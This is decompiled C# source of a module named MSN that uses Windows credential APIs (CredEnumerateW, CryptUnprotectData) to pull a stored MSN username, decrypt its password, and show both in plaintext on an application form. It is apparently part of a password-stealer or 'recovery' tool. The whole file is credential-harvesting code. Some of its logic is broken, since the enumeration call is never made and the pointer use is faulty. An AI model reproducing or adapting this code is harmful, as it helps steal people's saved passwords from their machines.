using System;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using My;

// Token: 0x02000020 RID: 32
[StandardModule]
internal sealed class MSN
{
	// Token: 0x0600015E RID: 350
	[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool CredEnumerateW(string filter, uint flag, uint count, IntPtr pCredentials);

	// Token: 0x0600015F RID: 351
	[DllImport("crypt32", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern bool CryptUnprotectData(ref MSN.DATA_BLOB dataIn, int ppszDataDescr, int optionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, MSN.DATA_BLOB pDataOut);

	// Token: 0x06000160 RID: 352 RVA: 0x000061A0 File Offset: 0x000045A0
	public static string[] getPwd()
	{
		MSN.Password();
		return new string[]
		{
			MSN.uDetail.uName,
			MSN.uDetail.uPass
		};
	}

	// Token: 0x06000161 RID: 353 RVA: 0x000061E0 File Offset: 0x000045E0
	public static void Password()
	{
		try
		{
			IntPtr ptr = Marshal.ReadIntPtr(MSN.pCredentials, 0);
			object obj = Marshal.PtrToStructure(ptr, MSN.Cred.GetType());
			MSN.CREDENTIAL credential;
			MSN.Cred = ((obj != null) ? ((MSN.CREDENTIAL)obj) : credential);
			MSN.dataIn.pbData = MSN.Cred.CredentialBlob;
			MSN.dataIn.cbData = MSN.Cred.CredentialBlobSize;
			MSN.CryptUnprotectData(ref MSN.dataIn, 0, 0, 0, 0, 1, MSN.dataOut);
			MSN.dataOut.pbData = MSN.dataIn.pbData;
			MSN.uDetail.uName = MSN.Cred.UserName;
			IntPtr ptr2 = new IntPtr(MSN.dataOut.pbData);
			MSN.uDetail.uPass = Marshal.PtrToStringUni(ptr2);
			MyProject.Forms.Form1.msnt.Text = "Username: " + MSN.uDetail.uName + "\r\nPassword: " + MSN.uDetail.uPass;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x040000FF RID: 255
	private static MSN.CREDENTIAL Cred;

	// Token: 0x04000100 RID: 256
	public static uint count;

	// Token: 0x04000101 RID: 257
	public static IntPtr pCredentials = IntPtr.Zero;

	// Token: 0x04000102 RID: 258
	public static MSN.DATA_BLOB dataIn;

	// Token: 0x04000103 RID: 259
	public static MSN.DATA_BLOB dataOut;

	// Token: 0x04000104 RID: 260
	public static MSN.UserDetails uDetail;

	// Token: 0x02000021 RID: 33
	internal struct CREDENTIAL
	{
		// Token: 0x04000105 RID: 261
		public int Flags;

		// Token: 0x04000106 RID: 262
		public int Type;

		// Token: 0x04000107 RID: 263
		[MarshalAs(UnmanagedType.LPWStr)]
		public string TargetName;

		// Token: 0x04000108 RID: 264
		[MarshalAs(UnmanagedType.LPWStr)]
		public string Comment;

		// Token: 0x04000109 RID: 265
		public long LastWritten;

		// Token: 0x0400010A RID: 266
		public int CredentialBlobSize;

		// Token: 0x0400010B RID: 267
		public int CredentialBlob;

		// Token: 0x0400010C RID: 268
		public int Persist;

		// Token: 0x0400010D RID: 269
		public int AttributeCount;

		// Token: 0x0400010E RID: 270
		public IntPtr Attributes;

		// Token: 0x0400010F RID: 271
		[MarshalAs(UnmanagedType.LPWStr)]
		public string TargetAlias;

		// Token: 0x04000110 RID: 272
		[MarshalAs(UnmanagedType.LPWStr)]
		public string UserName;
	}

	// Token: 0x02000022 RID: 34
	internal struct DATA_BLOB
	{
		// Token: 0x04000111 RID: 273
		public int cbData;

		// Token: 0x04000112 RID: 274
		public int pbData;
	}

	// Token: 0x02000023 RID: 35
	internal struct UserDetails
	{
		// Token: 0x04000113 RID: 275
		public string uName;

		// Token: 0x04000114 RID: 276
		public string uPass;
	}
}
